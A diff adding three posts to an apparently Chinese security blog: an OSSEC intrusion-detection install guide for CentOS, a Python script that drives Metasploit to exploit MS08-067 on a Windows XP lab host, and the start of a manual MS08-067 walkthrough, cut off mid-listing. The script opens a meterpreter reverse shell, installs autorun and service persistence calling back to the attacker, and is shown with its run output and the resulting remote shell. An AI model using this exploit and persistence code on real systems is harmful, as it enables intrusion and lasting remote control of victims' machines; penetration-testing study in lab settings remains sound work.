@@ -184,6 +184,284 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Centos-6-6-Install-OSSEC" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/sec/Centos-6-6-Install-OSSEC/">Centos 6.6 Install OSSEC</a>
+    </h1>
+  
+
+        
+        <a href="/sec/Centos-6-6-Install-OSSEC/" class="archive-article-date">
+  	<time datetime="2016-08-27T12:22:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>OSSEC是一款开源的基于主机的入侵检测系统，可以简称为HIDS。它具备日志分析，文件完整性检查，策略监控，rootkit检测，实时报警以及联动响应等功能。它支持多种操作系统：Linux、Windows、MacOS、Solaris、HP-UX、AIX。属于企业安全之利器。</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>CentOS 6.6</p>
+<h1 id="安装关联库和软件"><a href="#安装关联库和软件" class="headerlink" title="安装关联库和软件"></a>安装关联库和软件</h1><p>首先我们安装需要用到的关联库和软件，由于我们最终是需要把日志导入到MySQL中进行分析，以及需要通过web程序对报警结果进行展示，同时需要把本机当做SMTP，所以需要在本机安装MySQL、Apache和sendmail服务。在当前的终端中执行如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install wget gcc make mysql mysql-server mysql-devel httpd php php-mysql sendmail</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h1 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@ossec-server ~]# /etc/init.d/httpd start</div><div class="line">[root@ossec-server ~]# /etc/init.d/mysqld start</div><div class="line">[root@ossec-server ~]# /etc/init.d/sendmail start</div></pre></td></tr></table></figure>
+<h2 id="Mysql相关配置"><a href="#Mysql相关配置" class="headerlink" title="Mysql相关配置"></a>Mysql相关配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[root@ossec-server ~]# mysql -uroot -p</div><div class="line">mysql&gt; create database ossec;</div><div class="line">mysql&gt; grant INSERT,SELECT,UPDATE,CREATE,DELETE,EXECUTE on ossec.* to ossec@localhost;</div><div class="line">mysql&gt; set password for ossec@localhost=PASSWORD(&apos;ossec&apos;);</div><div class="line">mysql&gt; flush privileges;</div><div class="line">mysql&gt; exit</div></pre></td></tr></table></figure>
+<h1 id="安装OSSEC服务端"><a href="#安装OSSEC服务端" class="headerlink" title="安装OSSEC服务端"></a>安装OSSEC服务端</h1><blockquote>
+<p>首先通过官网的链接下载当前的最新稳定版本 2.8.3 的服务端包，同时解压。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">wget https://akamai.bintray.com/87/87c7a1904d5c08c7cff3e42bd47c055b14b08faa?__gda__=exp=1465265745~hmac=3dacb2ddfc1c2aff8eeeff60f6c1ec8cbebf3dab98370b6894f3d87399be85ed&amp;response-content-disposition=attachment%3Bfilename%3D%22ossec-hids-2.8.3.tar.gz%22&amp;response-content-type=application%2Fgzip</div><div class="line"></div><div class="line">重命名文件</div><div class="line">mv 87c7a1904d5c08c7cff3e42bd47c055b14b08faa\?__gda__\=exp\=1465265745~hmac\=3dacb2ddfc1c2aff8eeeff60f6c1ec8cbebf3dab98370b6894f3d87399be85ed ossec.tar.gz</div><div class="line">解压</div><div class="line">[root@CentOS-6 ~]<span class="comment"># tar -zxf ossec.tar.gz</span></div><div class="line">[root@CentOS-6 ~]<span class="comment"># ls</span></div><div class="line">–                                         ossec-hids-2.8.3</div><div class="line">anaconda-ks.cfg                           ossec.tar.gz</div></pre></td></tr></table></figure>
+<blockquote>
+<p>为了使OSSEC支持MySQL，需要在安装前执行make setdb命令，如下</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[root@CentOS-6 ossec-hids-2.8.3]<span class="comment"># cd src</span></div><div class="line">[root@CentOS-6 src]<span class="comment"># ls</span></div><div class="line">addagent      error_messages    LOCATION      os_crypto    os_regex   syscheckd</div><div class="line">agentlessd    external          logcollector  os_csyslogd  os_xml     tests</div><div class="line">analysisd     headers           Makeall       os_dbd       os_zlib    util</div><div class="line">client-agent  init              Makefile      os_execd     remoted    VERSION</div><div class="line">config        InstallAgent.sh   monitord      os_maild     rootcheck  win32</div><div class="line">Config.Make   InstallServer.sh  os_auth       os_net       shared</div><div class="line">[root@CentOS-6 src]<span class="comment"># make setdb</span></div><div class="line">Info: Compiled with MySQL support.</div><div class="line">Info: Compiled with PostgreSQL support.</div><div class="line">[root@CentOS-6 src]<span class="comment"># cd ..</span></div></pre></td></tr></table></figure>
+<blockquote>
+<p>执行安装脚本</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">[root@CentOS-6 ossec-hids-2.8.3]# ./install.sh</div><div class="line">which: no host in (/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin)</div><div class="line"></div><div class="line">  ** Para instalação em português, escolha [br].</div><div class="line">  ** 要使用中文进行安装, 请选择 [cn].</div><div class="line">  ** Fur eine deutsche Installation wohlen Sie [de].</div><div class="line">  ** Για εγκατάσταση στα Ελληνικά, επιλέξτε [el].</div><div class="line">  ** For installation in English, choose [en].</div><div class="line">  ** Para instalar en Español , eliga [es].</div><div class="line">  ** Pour une installation en français, choisissez [fr]</div><div class="line">  ** A Magyar nyelvű telepítéshez válassza [hu].</div><div class="line">  ** Per l&apos;installazione in Italiano, scegli [it].</div><div class="line">  ** 日本語でインストールします．選択して下さい．[jp].</div><div class="line">  ** Voor installatie in het Nederlands, kies [nl].</div><div class="line">  ** Aby instalować w języku Polskim, wybierz [pl].</div><div class="line">  ** Для инструкций по установке на русском ,введите [ru].</div><div class="line">  ** Za instalaciju na srpskom, izaberi [sr].</div><div class="line">  ** Türkçe kurulum için seçin [tr].</div><div class="line">  (en/br/cn/de/el/es/fr/hu/it/jp/nl/pl/ru/sr/tr) [en]: cn</div><div class="line">which: no host in (/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin)</div></pre></td></tr></table></figure>
+<blockquote>
+<p>安装完成标识</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">感谢使用 OSSEC HIDS. 如果您有任何疑问,建议或您找到任何bug, 请通过　contact@ossec.net 或邮件列表 ossec-list@ossec.net 联系我们.</div><div class="line">( http://www.ossec.net/en/mailing_lists.html ).</div><div class="line"></div><div class="line">您可以在　http://www.ossec.net 获得更多信息</div><div class="line"></div><div class="line">--- 请按　ENTER 结束安装 (下面可能有更多信息). ---</div><div class="line"></div><div class="line">直到碰到上面内容，说明安装完成。</div></pre></td></tr></table></figure>
+<h1 id="配置服务端，使其工作正常"><a href="#配置服务端，使其工作正常" class="headerlink" title="配置服务端，使其工作正常"></a>配置服务端，使其工作正常</h1><blockquote>
+<p>执行下面命令启用数据库支持<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@CentOS-6 bin]# /var/ossec/bin/ossec-control enable database</div></pre></td></tr></table></figure></p>
+<p>导入MySQL表结构到MySQL中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@CentOS-6 bin]# mysql -uossec -p ossec &lt; ~/ossec-hids-2.8.3/src/os_dbd/mysql.schema</div></pre></td></tr></table></figure></p>
+<p>修改部分配置文件的权限，否则会启动服务失败：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@CentOS-6 etc]# chmod u+w /var/ossec/etc/ossec.conf</div></pre></td></tr></table></figure></p>
+<p>启动服务</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@CentOS-6 /]<span class="comment"># /etc/init.d/ossec-hids start</span></div><div class="line">Starting ossec-hids:                                       [确定]</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">OSSEC</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/sec/Centos-6-6-Install-OSSEC/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-Demo-MSF检测指定服务的漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/sec/Demo-MSF检测指定服务的漏洞/">[Demo] MSF检测指定服务的漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/sec/Demo-MSF检测指定服务的漏洞/" class="archive-article-date">
+  	<time datetime="2016-08-11T15:00:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#相关资源</p>
+<blockquote>
+<p> <a href="https://github.com/SpiderLabs/msfrpc/tree/master/python-msfrpc" target="_blank" rel="external">SpiderLabs/msfrpc</a></p>
+</blockquote>
+<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">用MSF检测指定服务的漏洞</div><div class="line">本脚本以 MS08-067为例</div><div class="line">'''</div><div class="line"></div><div class="line">__author__ = <span class="string">"SanNa"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> msfrpc</div><div class="line"><span class="keyword">import</span> optparse</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"></div><div class="line"></div><div class="line">LOGIN = <span class="string">'msf'</span></div><div class="line">PASSWD = <span class="string">'abc123'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">builder</span><span class="params">(RHOST, LHOST, LPORT)</span>:</span></div><div class="line">    <span class="string">'''根据相关信息创建文件</span></div><div class="line"></div><div class="line">    :param RHOST: 目标ip</div><div class="line">    :param LHOST: 监听IP</div><div class="line">    :param LPORT: 监听端口</div><div class="line"></div><div class="line">    '''</div><div class="line">    postcomms = <span class="string">"""getsystem</span></div><div class="line">            run persistence -S -U -X -i 10 -p 80 -r """+LHOST+<span class="string">"""</span></div><div class="line">            cd c:\\</div><div class="line">            upload /tmp/ms08067_patch.exe c:\\</div><div class="line">            upload /tmp/ms08067_install.bat c:\\</div><div class="line">            execute -f ms08067_install.bat</div><div class="line">            """</div><div class="line">    batcomm = <span class="string">"ms08067_patch.exe /quiet"</span></div><div class="line">    <span class="keyword">with</span> open (<span class="string">'/tmp/smbpost.rc'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> post, open(<span class="string">'/tmp/ms08067_install.bat'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> bat:</div><div class="line">        post.write(postcomms)</div><div class="line">        bat.write(batcomm)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sploiter</span><span class="params">(RHOST, LHOST, LPORT, session)</span>:</span></div><div class="line">    <span class="string">'''连接到msfconsole</span></div><div class="line"></div><div class="line">    :param RHOST: 目标ip</div><div class="line">    :param LHOST: 监听IP</div><div class="line">    :param LPORT: 监听端口</div><div class="line">    :param session: session</div><div class="line"></div><div class="line">    '''</div><div class="line">    client = msfrpc.Msfrpc(&#123;&#125;)</div><div class="line">    client.login(LOGIN, PASSWD)</div><div class="line">    ress = client.call(<span class="string">'console.create'</span>)</div><div class="line">    console_id = ress[<span class="string">'id'</span>]</div><div class="line"></div><div class="line">    <span class="comment"># Exploit MS08-067</span></div><div class="line">    commands = <span class="string">"""use exploit/windows/smb/ms08_067_netapi</span></div><div class="line">                set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">                set RHOST """+RHOST+<span class="string">"""</span></div><div class="line">                set LHOST """+LHOST+<span class="string">"""</span></div><div class="line">                set LPORT """+LPORT+<span class="string">"""</span></div><div class="line">                set ExitOnSession false</div><div class="line">                exploit -z</div><div class="line">            """</div><div class="line">    <span class="keyword">print</span> <span class="string">"[+] Exploiting MS08-067 on: "</span> + RHOST</div><div class="line">    client.call(<span class="string">'console.write'</span>,[console_id,commands])</div><div class="line">    res = client.call(<span class="string">'console.read'</span>,[console_id])</div><div class="line">    result = res[<span class="string">'data'</span>].split(<span class="string">'\n'</span>)</div><div class="line"></div><div class="line">    <span class="comment"># 运行攻击脚本</span></div><div class="line">    runPost = <span class="string">"""use post/multi/gather/run_console_rc_file</span></div><div class="line">                set RESOURCE /tmp/smbpost.rc</div><div class="line">                set SESSION """+session+<span class="string">"""</span></div><div class="line">                exploit</div><div class="line">              """</div><div class="line">    <span class="keyword">print</span> <span class="string">"[+] Running post-exploit script on: "</span> + RHOST</div><div class="line">    client.call(<span class="string">'console.write'</span>,[console_id,runPost])</div><div class="line">    rres = client.call(<span class="string">'console.read'</span>,[console_id])</div><div class="line"></div><div class="line">    <span class="comment">#Setup Listener for presistent connection back over port 80</span></div><div class="line">    sleep(<span class="number">10</span>)</div><div class="line">    listen = <span class="string">"""use exploit/multi/handler</span></div><div class="line">            set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">            set LPORT 80</div><div class="line">            set LHOST """+LHOST+<span class="string">"""</span></div><div class="line">            exploit</div><div class="line">            """</div><div class="line">    <span class="keyword">print</span> <span class="string">"[+] Setting up listener on: "</span> + LHOST + <span class="string">":80"</span></div><div class="line">    client.call(<span class="string">'console.write'</span>,[console_id,listen])</div><div class="line">    lres = client.call(<span class="string">'console.read'</span>,[console_id])</div><div class="line">    <span class="keyword">print</span> lres</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    parser = optparse.OptionParser(sys.argv[<span class="number">0</span>] +\</div><div class="line">            <span class="string">' -p LPORT -r RHOST -l LHOST -s session'</span>)</div><div class="line">    parser.add_option(<span class="string">'-p'</span>, dest=<span class="string">'LPORT'</span>, type=<span class="string">'string'</span>, \</div><div class="line">            help =<span class="string">'specify a port to listen on'</span>)</div><div class="line">    parser.add_option(<span class="string">'-r'</span>, dest=<span class="string">'RHOST'</span>, type=<span class="string">'string'</span>, \</div><div class="line">            help=<span class="string">'Specify a remote host'</span>)</div><div class="line">    parser.add_option(<span class="string">'-l'</span>, dest=<span class="string">'LHOST'</span>, type=<span class="string">'string'</span>, \</div><div class="line">            help=<span class="string">'Specify a local host'</span>)</div><div class="line">    parser.add_option(<span class="string">'-s'</span>, dest=<span class="string">'session'</span>, type=<span class="string">'string'</span>, \</div><div class="line">            help =<span class="string">'specify session ID'</span>)</div><div class="line">    (options, args) = parser.parse_args()</div><div class="line">    session=options.session</div><div class="line">    RHOST=options.RHOST; LHOST=options.LHOST; LPORT=options.LPORT</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (RHOST == <span class="keyword">None</span>) <span class="keyword">and</span> (LPORT == <span class="keyword">None</span>) <span class="keyword">and</span> (LHOST == <span class="keyword">None</span>):</div><div class="line">        <span class="keyword">print</span> parser.usage</div><div class="line">        sys.exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">    builder(RHOST, LHOST, LPORT)</div><div class="line">    sploiter(RHOST, LHOST, LPORT, session)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<h1 id="执行方式"><a href="#执行方式" class="headerlink" title="执行方式"></a>执行方式</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜  ~  python 333msf.py -p 4444 -r 192.168.1.43 <span class="_">-l</span> 192.168.1.8 <span class="_">-s</span> 8</div><div class="line">[+] Exploiting MS08-067 on: 192.168.1.43</div><div class="line">[+] Running post-exploit script on: 192.168.1.43</div><div class="line">[+] Setting up listener on: 192.168.1.8:80</div><div class="line">[&#123;<span class="string">"prompt"</span>: <span class="string">"\u0001\u0002msf\u0001\u0002 post(\u0001\u0002\u0001\u0002run_console_rc_file\u0001\u0002) \u0001\u0002&gt; "</span>, <span class="string">"busy"</span>: <span class="literal">true</span>, <span class="string">"data"</span>: <span class="string">"PAYLOAD =&gt; windows/meterpreter/reverse_tcp\nRHOST =&gt; 192.168.1.43\nLHOST =&gt; 192.168.1.8\nLPORT =&gt; 4444\nExitOnSession =&gt; false\n[*] Started reverse TCP handler on 192.168.1.8:4444 \n[*] Automatically detecting the target...\n[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\n[*] Attempting to trigger the vulnerability...\n[*] Sending stage (957487 bytes) to 192.168.1.43\n[*] Meterpreter session 8 opened (192.168.1.8:4444 -&gt; 192.168.1.43:1139) at 2016-06-03 21:13:38 +0800\n[*] Session 8 created in the background.\nRESOURCE =&gt; /tmp/smbpost.rc\nSESSION =&gt; 7\n[*] Running module against DH-CA8822AB9589\n[*] Running command getsystem\n[*] Running command                 run persistence -S -U -X -i 10 -p 80 -r 192.168.1.8\n"</span>&#125;]</div></pre></td></tr></table></figure>
+<h1 id="执行脚本时msf端命令行回显"><a href="#执行脚本时msf端命令行回显" class="headerlink" title="执行脚本时msf端命令行回显"></a>执行脚本时msf端命令行回显</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[*] Running Persistance Script</div><div class="line">[*] Resource file <span class="keyword">for</span> cleanup created at /root/.msf7/logs/persistence/DH-CA8822AB9589_20160603.2703/DH-CA8822AB9589_20160603.2703.rc</div><div class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=80</div><div class="line">[*] Persistent agent script is 148419 bytes long</div><div class="line">[+] Persistent Script written to C:\WINDOWS\TEMP\IezQttslf.vbs</div><div class="line">[*] Executing script C:\WINDOWS\TEMP\IezQttslf.vbs</div><div class="line">[+] Agent executed with PID 2720</div><div class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DIwbwLlJMJ</div><div class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DIwbwLlJMJ</div><div class="line">[*] Installing as service..</div><div class="line">[*] Creating service YsimPwZAk</div><div class="line">[*] Meterpreter session 3 opened (192.168.1.8:80 -&gt; 192.168.1.43:1083) at 2016-06-03 18:27:06 +0800</div></pre></td></tr></table></figure>
+<h1 id="session"><a href="#session" class="headerlink" title="session"></a>session</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">msf &gt; sessions</div><div class="line"></div><div class="line">Active sessions</div><div class="line">===============</div><div class="line"></div><div class="line">  Id  Type                   Information                                      Connection</div><div class="line">  --  ----                   -----------                                      ----------</div><div class="line">  7   meterpreter x86/win32  DH-CA8822AB9589\Administrator @ DH-CA8822AB9589  192.168.1.8:80 -&gt; 192.168.1.43:1138 (192.168.1.43)</div><div class="line">  8   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ DH-CA8822AB9589            192.168.1.8:4444 -&gt; 192.168.1.43:1139 (192.168.1.43)</div><div class="line"></div><div class="line"></div><div class="line">msf &gt; sessions -i 8</div><div class="line">[*] Starting interaction with 6...</div></pre></td></tr></table></figure>
+<h1 id="相关操作"><a href="#相关操作" class="headerlink" title="相关操作"></a>相关操作</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; sysinfo</div><div class="line">Computer        : DH-CA8822AB9589</div><div class="line">OS              : Windows XP (Build 2600, Service Pack 3).</div><div class="line">Architecture    : x86</div><div class="line">System Language : en_US</div><div class="line">Domain          : WORKGROUP</div><div class="line">Logged On Users : 2</div><div class="line">Meterpreter     : x86/win32</div><div class="line">meterpreter &gt; shell</div><div class="line">Process 3492 created.</div><div class="line">Channel 1 created.</div><div class="line">Microsoft Windows XP [Version 5.1.2600]</div><div class="line">(C) Copyright 1985-2001 Microsoft Corp.</div><div class="line"></div><div class="line">C:\Documents and Settings\Administrator&gt;ipconfig</div><div class="line">ipconfig</div><div class="line"></div><div class="line">Windows IP Configuration</div><div class="line"></div><div class="line"></div><div class="line">Ethernet adapter Local Area Connection:</div><div class="line"></div><div class="line">        Connection-specific DNS Suffix  . :</div><div class="line">        IP Address. . . . . . . . . . . . : 192.168.1.43</div><div class="line">        Subnet Mask . . . . . . . . . . . : 255.255.255.0</div><div class="line">        Default Gateway . . . . . . . . . : 192.168.1.1</div><div class="line"></div><div class="line">C:\Documents and Settings\Administrator&gt;</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Metasploit</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/sec/Demo-MSF检测指定服务的漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-Test-MS08-067" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/sec/Test-MS08-067/">Test-MS08-067</a>
+    </h1>
+  
+
+        
+        <a href="/sec/Test-MS08-067/" class="archive-article-date">
+  	<time datetime="2016-08-10T13:44:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Kali2.0</div><div class="line">192.168.1.8</div><div class="line">W<span class="keyword">in</span>XPenSP3</div><div class="line">192.168.1.43</div></pre></td></tr></table></figure>
+<h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msf auxiliary(syn) &gt; use exploit/windows/smb/ms08_067_netapi</div><div class="line">msf exploit(ms08_067_netapi) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</div><div class="line">payload =&gt; windows/meterpreter/reverse_tcp</div></pre></td></tr></table></figure>
+<h1 id="Show-Option"><a href="#Show-Option" class="headerlink" title="Show Option"></a>Show Option</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms08_067_netapi) &gt; show options</div><div class="line"></div><div class="line">Module options (exploit/windows/smb/ms08_067_netapi):</div><div class="line"></div><div class="line">   Name     Current Setting  Required  Description</div><div class="line">   ----     ---------------  --------  -----------</div><div class="line">   RHOST                     yes       The target address</div><div class="line">   RPORT    445              yes       Set the SMB service port</div><div class="line">   SMBPIPE  BROWSER          yes       The pipe name to use 